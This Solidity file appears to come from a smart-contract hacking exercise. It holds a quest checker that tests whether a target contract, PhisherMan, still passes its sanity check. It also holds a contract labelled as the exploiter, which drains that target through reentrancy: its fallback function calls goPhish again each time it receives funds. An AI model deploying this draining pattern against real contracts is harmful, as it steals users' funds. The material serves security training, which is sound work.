pragma solidity ^0.5.4;

interface QuestInterface{
  function testStep(uint step, RootQuestInstance instance) external returns (bool);
}
interface RootQuestInstance{
    function getStepContract(uint id) external view returns (address);
    function getHacker() external view returns (address);
}

contract BadPhishQuest is QuestInterface{
    function testStep(uint step, RootQuestInstance instance) external returns (bool){
        PhisherMan p = PhisherMan(instance.getStepContract(0));
        return step1Test(p);
    }
    function step1Test(PhisherMan phisher) internal returns (bool){
        return !phisher.sanityCheck();
    }
}



//exploiter
contract DeepPhisher{
    function() external payable{
        //if the next goPhish would cause contract to attempt to send more funds than available
        if(address(msg.sender).balance < msg.value){
            return;
        }
        PhisherMan s = PhisherMan(msg.sender);
        s.goPhish(address(this), 1);
    }
    function drain(PhisherMan phisher) external returns (uint256){
        phisher.goPhish(address(this), 1);
        return address(this).balance;
    }
    function depositTo(PhisherMan phisher) external payable{
        phisher.deposit.value(msg.value)();
    }
}

